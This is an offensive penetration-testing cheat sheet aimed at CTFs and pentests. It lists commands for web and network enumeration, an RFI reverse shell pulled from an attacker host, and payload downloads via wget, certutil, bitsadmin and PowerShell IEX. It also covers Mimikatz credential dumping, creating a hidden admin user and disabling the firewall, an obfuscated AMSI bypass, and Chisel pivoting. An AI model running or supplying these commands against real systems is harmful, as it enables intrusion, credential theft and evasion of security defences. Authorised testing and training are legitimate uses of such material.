# Pentest Common Commands Reference
This is a cheat sheet of common and useful commands I use for CTFs and Penetration Tests. This is primarily focused on offensive security operations in a network or against a single target host.

Prereqs:
Download and install my tools from here:
- https://github.com/Z333RO/security-tools-public/blob/main/kali_autosetup/1st_download_tools_payloads.sh
- https://github.com/Z333RO/security-tools-public/blob/main/kali_autosetup/2nd_update_install.sh

# Web Enumeration 
## dirb
```
dirb http://172.0.0.1/
dirb http://172.0.0.1/ /path/to/wordlist.txt
```

## ffuf
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://192.10.10.10/FUZZ -recursion -recursion-depth 1 -e .php -v 
```

## gobuster
```
gobuster -k -u https://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,asp,aspx,html -t 40
```

## dirsearch

```
sudo dirsearch -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.13/ -e all -t 50
```

## nuclei
```
# Basic commands
nuclei -u http://10.10.10.13
nuclei -u http://website.com

# Run this over proxychains to scan a target on another subnet - ie chisel
proxychains -q nuclei -proxy 'socks5://localhost:1080' -u 172.16.1.19
```

## WPScan
```
wpscan --url http://10.10.10.10/wordpress/ --wp-content-dir -ep -et -eu
wpscan --disable-tls-checks --random-user-agent --url http://10.10.10.10/wp-login.php
wpscan -U users.txt -P /wordlist.txt --url http://10.10.110.100:8080/wordpress/
```

## Axiom 


# Network Enumeration 
## rustscan
```
Scan all ports
rustscan -a 10.10.10.13 --ulimit 5000 --range 1-65535 -- -sVC -Pn
rustscan -a 10.10.10.0/24 --ulimit 5000 --range 1-65535 -- -sVC -Pn
```

## nmap 
```
nmap -sVC 10.10.10.13
nmap -sVC 10.10.10.0/24
```

## crackmapexec
```
crackmapexec smb 10.10.10.0/24 -u '' -p '' --shares
crackmapexec smb 10.10.110.0/24 -u users.txt -p password.txt continue-on-success
crackmapexec smb targets.txt -u Administrator -H NTLM_HASH_HERE --local-auth
```
## enum4linux
```
enum4linux -v target-ip
enum4linux -a target-ip

```

## enum4linux-ng
```
python3 enum4linux-ng.py 10.11.10.10
```

## Autorecon
Fast autorecon
```
sudo python3 autorecon.py --nmap-append='-T4 --min-rate=5000' --exclude-tags="top-100-udp-ports" --dirbuster.threads=30 target_ip_here -v
```

## smbmap
```
smbmap -u 'testuser' -p 'password123' -H 10.10.10.100 -R
smbmap -u testuser -p password123 -d some-domain.local -H 10.10.10.10
```

## manspider
```
# Search for filenames that may contain creds
manspider 10.10.10.10 -f passw user admin account network login logon cred -d some-domain.local -u '' -p ''

# Search for interesting file extensions
manspider 10.10.10.10 -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml -d some-domain.local -u '' -p ''
```

## bloodhound


# Common and Useful Exploit Methods - Footholds
## File Upload - Reverse Shells 
```
# File upload via curl
curl -XPUT -d @shell.php http://website.com/webdav/shell.php -u 'administrant:sleepless' 
```

## RFI - Remote File Inclusion
Find a file path on URL that can read internal files on target (LFI) or read external pages from other sites (RFI). See below example on how to execute - (example is for a web server running on linux):

Attacker Machine - copy over the reverse shell payload to server folder.
```
cd /server
cp /usr/share/laudanum/php/php-reverse-shell.php .
```
Here make sure to edit the payload to be your attacker IP and port and run netcat.
```
gedit php-reverse-shell.php
python3 -m http.server 80
rlwrap nc -lvnp 443
```

Target machine - you can either directly browse to the file from browser or run curl command to trigger it, remember to have netcat running
```
Browse to http://target_IP/image.php?img=http://attacker_IP/php-reverse-shell.php
or
curl "http://target_IP/image.php?img=http://attacker_IP/php-reverse-shell.php"
```

# File Transfer Methods
## Linux - wget
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE
wget http://atacker_ip:80/name_of_file.php
```

## Windows - certutil
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE
certutil -urlcache -f http://attacker_ip:80/name_of_file.exe
```

## Windows - powershell
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE (various commands by line - pick what you want)
powershell wget http://attacker_ip/nc.exe -outfile nc.exe

# Run "powershell -ep bypass" first
IEX (New-Object Net.WebClient).DownloadString("http://attacker_ip/PowerView.ps1")
```

## Windows - LOLBAS
```
bitsadmin.exe /transfer /Download /priority Foreground http://attacker_IP:80/name_of_file.exe
```

## smbserver
Check your kali machine on /tmp/smbshare and you can now transfer files to and from the target. On target machine, if you have RDP, you can easily check the network share on file explorer and transfer over files
```
# Attacker machine
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# Target machine
net use n: \\192.168.220.133\share /user:test test
```

## RDP Mount
First one is with user and pass, second line is for user and NT hash. Once you successfully connect, you should see on the file explorer the network share and you can transfer files to and from your kali machine to target. Files will appear in your /tmp folder.
```
xfreerdp /v:target_IP /u:user /p:password9 /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
xfreerdp /v:target_IP /u:user /pth:NT_HASH /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```

## NFS Mount
```
showmount -e <ip of target>

# Mount
mount -t nfs 10.10.10.10:/path/to/folder/on/target /path/to/mount/folder/on/my/machine
mount -t nfs -o vers=4 10.10.10.10:/home/some_user /home/kali/new_back -o nolock

# Unmount
sudo umount -t nfs 10.10.10.10:/home /mnt/some_folder
```

# Cracking and Bruteforce

## Hydra

## John

## Hashcat
```
# Crack kerberos ticket
hashcat -m 13100 kerb_crack.txt /usr/share/wordlists/rockyou.txt
```

## FFUF

## WPScan Bruteforce
Run the following to bruteforce the login with a user and pass list:
```
wpscan -U users.txt -P /home/kali/loot/pass.txt --url http://target_ip:80/wordpress_directory_just_replace_this/
```

# Local Enumeration for Privesc
## Linux
### Linpeas

### Linux Exploit Suggester

### PsPY


## Windows
### Winpeas

### Windows Exploit Suggester

# Common and Useful Exploit Methods - PrivEsc
## PwnKit

## Kernel Exploits

## Potatoes



# Post Exploitation 
## Mimikatz
```
mimikatz.exe
privilege::debug
token::elevate

# Common commands to run through and dump hashes/creds

sekurlsa::logonpasswords
lsadump::secrets
lsadump::sam
lsadump::sam /dump
lsadump::sam /patch
lsadump::cache
lsadump::lsa /patch
lsadump::lsa /inject
sekurlsa::pth
```

## Pypykatz
```
# Crack sam files
pypykatz registry --sam sam.txt --security security.txt system.txt
```


## Rubeus
```
Rubeus.exe kerberoast /nowrap
```

## LaZagne
```
LaZagne.exe all
```

## Snaffler
```
snaffler.exe -s -o snaffler.log
```

## Enable RDP access for user
Run all the commands in sequence below:
```
# Create a user on the compromised host from admin account
net user hacker password123 /add

# Add yourself to admin group
net localgroup "Administrators" hacker /add

# This will put you in the RDP group
net localgroup "Remote Desktop Users" hacker /add

# Disable firewall
netsh firewall set opmode disable

# This activates RDP on the box
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f  
```

## ADPEASS

## 

# AV Bypass Techniques

## AMSI Bypass
Paste this into the command line and run before executing powershell scripts:
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; (Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```


# Pivoting

## SSH Tunneling 
First we need to configure the proxychains4.conf file.
```
sudo gedit/etc/proxychains4.conf
```
Comment out strict_chain and uncomment dynamic_chain.
Uncomment proxy_dns.

Make sure that at the bottom we have socks4 proxy uncommented:
```
socks 4        127.0.0.1 9050
```

Next we need to start the tor proxy.
```
sudo service tor status
sudo service tor start
sudo service tor status
```

Create an SSH tunnel into the machine that is connected to the internal network/subnet. You can ssh via username/pass or use an SSH key id_rsa:
```
ssh -NfD 9050 root@<IP Address>
or
chmod 600 id_rsa
ssh -NfD 9050 root@<IP Address> -i id_rsa
```
Now test with proxychains:
```
proxychains -q crackmapexec smb 10.10.11.0/24 -u '' -p '' --shares
```
To kill the SSH tunnel just run `ps aux | grep ssh` and `kill <process id>`.


## Chisel - Single Pivot Example
```
# On our attacker machine
chisel server -p 8001 --reverse
gedit /etc/proxychains4.conf

# Add this in /etc/proxychains4.conf file to the bottom and comment out any other proxies
socks5 127.0.0.1 1080

# Run a python server on our attacker machine where we have the chisel binary hosted, usually in the ~/server folder
python3 -m http.server 80

# Target machine where you have shell
# upload chisel to target machine - run this from root at the target 
wget http://attacker_ip:80/chisel
chmod +x chisel
./chisel client attacker_ip:8001 R:1080:socks

# Now do a quick test to see if you can reach the internal network
proxychains -q crackmapexec smb 10.10.11.0/24 -u '' -p '' --shares
```

## Chisel - Double/Multi Pivot Example
```
Create the following lines on proxychains4.conf
socks5 127.0.0.1 1080
#socks5 127.0.0.1 2080
#socks5 127.0.0.1 3080

This is on your attacker machine
chisel server -p 8001 --reverse # Do this on attacker machine aka us

# First pivot jump box - target machine
ssh -i id_rsa rooth@10.10.10.100
wget http://10.10.14.7:80/chisel
chmod +x chisel
# run this on the target machine - remember the ip here is your attacker machine
./chisel client 10.10.14.13:8001 R:1080:socks 

# PWN the 2nd box
proxychains -q impacket-psexec 'testuser'@172.16.1.10 -hashes ':NTLM_HASH_HERE'
bitsadmin.exe /transfer /Download /priority Foreground http://10.10.14.13:80/chisel.exe c:\windows\temp\chisel.exe

# Attacker machine 
#do this on another tab
chisel server -p 8002 --reverse 

# 2nd box to pivot - on the target box you already pwned
chisel.exe client 10.10.14.13:8002 R:2080:socks   # remember the ip here is your attacker machine

# Attacker Machine - configure proxychains4.conf
comment out socks5 127.0.0.1 1080
uncomment socks5 127.0.0.1 2080

# Attacker Machine - PWN the 3rd box
proxychains -q impacket-psexec 'administrator'@172.16.2.10 -hashes ':NTLM_HASH_HERE'

Wash rinse repeat to pivot a 3rd, 4th time etc...
```

## Chisel - Local Port Forward / Firewall Bypass
Scenario: You follow the above steps and pwn a jump box, pivot to first internal subnet, then pivot to a second internal subnet and pwn a machine in each subnet. There is another machine in the second internal subnet 172.16.2.17 which has an open ssh port based on scans from the compromised machine in that second internal subnet. There is a firewall and the only way to ssh to that port is to do local port forwarding.

In this example, 10.10.14.13 is your attack machine IP and 172.16.2.10 is the pwned machine in the 2nd internal subnet. 

Refer to this example: 10.10.14.13 (attacker machine) > 10.10.10.100 (jumpbox) > 172.16.1.10 (box in 1st internal subnet) > 172.16.2.10 (box in 2nd internal subnet) - 172.16.10.17 (next target hidden behind firewall)

```
# FIRST on attacker machine run this:
chisel server -p 8003 --reverse 

On the 172.16.2.10 machine run this:
chisel client 10.10.14.13:8003 R:0.0.0.0:2222:172.16.2.17:22

Now try to nmap yourself and see if port 2222 is open which should be the ssh port of 172.16.2.17
nmap 127.0.0.1 -p 2222

Now run ssh to your localhost.
ssh testuser@127.0.0.1 -p 2222
```


## Metasploit Proxy

# Misc Commands

## docker commands
Install on Kali
```
sudo apt install docker.io
sudo apt install docker-compose
```
Pull image
```
docker pull domain.io/container/here/amd64:latest
```
List images
```
docker image ls
```
Remove images
```
docker image rm ubuntu:22.04
```
Run docker image
```
docker run -it helloworld /bin/bash
```
Print all containers running:
```
docker ps
```
Get a bash shell on the docker container
```
docker exec -it <container_id> bash
```
Copy over files to container
```
docker cp /path/to/local/file <container_id>:/path/inside/container
```
Copy files from container to local folder
```
docker cp <container_id>:/path/inside/container /path/on/local_host
```

# Troubleshooting

## Corrupt zsh history file fix
```
cd ~
mv .zsh_history .zsh_history_bad
strings -eS .zsh_history_bad > .zsh_history
fc -R .zsh_history
```
